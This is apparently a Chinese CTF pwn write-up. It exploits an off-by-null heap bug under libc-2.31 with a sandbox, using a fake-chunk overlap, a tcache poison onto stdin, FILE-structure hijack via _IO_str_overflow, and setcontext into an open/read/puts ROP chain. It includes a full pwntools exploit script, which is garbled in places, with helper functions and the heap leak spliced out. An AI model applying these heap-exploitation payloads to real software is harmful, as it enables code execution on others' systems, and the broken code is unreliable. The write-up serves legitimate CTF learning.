  * add：添加一个堆块，要求size 1 )                                 // check
      {
        read(0, a1, v1 - 1);
        a1[v1] = 0;                                 // off by null
      }
      free(a1);
    }
大致的逻辑就是设置__free_hook为edit或者show函数，先执行edit、show函数然后再free
    ptr[v2] = 0LL;
    size_[v2] = 0LL;
指针和size都做了清0的处理，不存在uaf的问题。  
该题目的漏洞点在于上述的edit功能中。试想一下，有个大小为0x20的chunk，如果前一个堆块不是free状态，那么他的size=0x21，v1=0x21-9=0x18，写入大小0x18的数据，然后a1[0x18]=0，这里就出现了问题，off
by null的漏洞。
###  0x01 exploit
现在整理一下思路，首先考虑泄漏地址的问题。通过数据信息的残留，可以比较轻易的获得libcbase和heap
addr。那么，最关键的问题就是libc-2.31下的off by null的利用以及orw绕过沙箱机制。
####  off by null的利用
这里，已经有很多师傅对libc-2.31的增添的保护机制进行了深入的分析，主要是添加了presize和size的check，如果大小不一致的话，就会报错。这就使得之前版本的利用思路失效了。
这里，采用了如下的绕过思路：在chunk中伪造一个chunk，主要是伪造size、fd、bk的值，size写成presize，而fd=bk写成伪造的chunk的heap
addr，如下图所示
    pwndbg> x/20xg 0x55c1a0806140
    0x55c1a0806140:    0x6161616161616161    0x0000000000000151
    0x55c1a0806150:    0x0000000000000000    0x0000000000000371//fake chunk
    0x55c1a0806160:    0x000055c1a0806150    0x000055c1a0806150
    0x55c1a0806170:    0x6161616161616161    0x6161616161616161
    0x55c1a0806180:    0x6161616161616161    0x6161616161616161
然后就可以正常写入presize并触发off by null的漏洞，然后free堆块，就构成chunk overlap。
####  orw沙箱绕过
目前我已知的libc-2.31的orw沙箱绕过思路有2种，有其他思路的师傅也欢迎交流。
一种是借助free_hook，写入一个ropgaget，将rdi转换成rdx，然后借助set_context函数来实现。就本题来说，无法利用free_hook，这里的free_hook是在bss段上的，而我们无法泄漏地址。
这里我们使用另一种利用方式，malloc_hook+io劫持来实现orw的执行。这里，推荐一篇其他师傅的分析文章，写的很详细：  
[link](https://gist.github.com/Mech0n/43bb087bfe0fbe9f80dbccb815f5cab3)  
主要的利用链是这样的：
    exit函数触发-->_IO_cleanup()-->_IO_flush_all_lockp()-->_IO_str_overflow
    //触发__malloc_hook
    在_IO_str_overflow (FILE *fp, int c)种会调用 new_buf = malloc (new_size);
    //rdi-->rdx，方便后面set_context的利用，这里的rdi就是stdin(fp)
    0x7ffff7e62b65 :   mov    rdx,QWORD PTR [rdi+0x28]
这一部分的关键payload如下，需要绕过那些关键check都在下面做了相关注释：
    payload = b'\x00'*0x28#把flag处的值设置为\x00,绕过代码中的很多check
    #fp->_mode _IO_write_ptr > fp->_IO_write_base)
    payload += p64(stdin + 0xe0)#_IO_write_ptr && rdi+0x28-->rdx 
    payload = payload.ljust(0xd8,b'\x00')
    payload += p64(libcbase + 0x1ed560)#_IO_str_jumps 为了执行的是_IO_str_overflow
    payload += orw
    payload = payload.ljust(0x1f0,b'\x00')
    payload += p64(libcbase+0x0000000000580DD)#malloc_hook-->set_context
###  0x02 myexp
具体的exp如下所示：
    from pwn import *
    context.log_level='debug'
    def debug():
        print(pidof(p))
        pause()
    def choice(i):
        p.sendlineafter('choice:',str(i))
    def add(n,s):
        choice(1)
        p.sendlineafter('Size of info:',str(n))#n'+ hex(heap))
    #debug()
    #leak libcbase
    for i in range(2,0x8):
        show(i)
    #add(0xe0,b'a'*8)
    add(0xa0,b'a'*8)
    show(0)
    p.recvuntil(b'a'*8)
    libcbase=u64(p.recv(6).ljust(8,b'\x00'))-(0x00007fd0cccfbdd0-0x7fd0ccb10000)
    #off by null 
    #only rest index=8,9,10,11
    #0x100-->0x150 0x150+0xb0=0x200
    add(0x140,p64(0)+p64(0x191+0x40+0x1a0)+p64(heap+(0x5609760e2190-0x5609760e1000-0x40))+p64(heap+(0x5609760e2190-0x5609760e1000-0x40)))#0
    debug()
    edit(9,b'a'*0x10+p64(0x190+0x40+0x1a0))
    show(10)#get overlap
    #orw 
    stdin = libcbase + (0x7f277caba980-0x7f277c8cf000)
    ret=0x0000000000025679+libcbase
    pop_rdi=libcbase+0x0000000000026b72
    pop_rsi=libcbase+0x0000000000027529
    pop_rdx_rbx=libcbase+0x0000000000162866
    flag = heap + 0x565150050530 + 0x1e0 - 0x56515004f000 + 0x1a0
    orw = p64(pop_rdi)+p64(flag)+p64(pop_rsi)+p64(0)+p64(libc.symbols['open']+libcbase)
    orw += p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(flag)+p64(pop_rdx_rbx)+p64(0x50)+p64(0)+p64(libc.symbols['read']+libcbase)
    orw += p64(pop_rdi)+p64(flag)+p64(libc.symbols['puts']+libcbase)
    if len(orw) > 0xa0:
        print("orw too long ")
        pause()
    orw = orw.ljust(0xa0,b'\x00')
    orw += p64(stdin + 0xe0) + p64(ret)
    #stdin = libcbase + (0x7f277caba980-0x7f277c8cf000)
    payload = b'\x00'*0x28
    payload += p64(stdin + 0xe0)#_IO_write_ptr && rdi+0x28-->rdx
    payload = payload.ljust(0xd8,b'\x00')
    payload += p64(libcbase + 0x1ed560)#_IO_str_jumps
    payload += orw
    payload = payload.ljust(0x1f0,b'\x00')
    payload += p64(libcbase+0x0000000000580DD)#malloc_hook-->set_context
    show(12)
    show(8)
    add(0x130,b'a')
    add(0x50,p64(stdin))#fd-->stdin
    add(0x200,b'a')
    add(0x200,payload)
    debug()
    p.interactive()
然后拿到flag
最后，如果文中有什么错误请各位师傅指出；如果有更好的思路欢迎交流分享。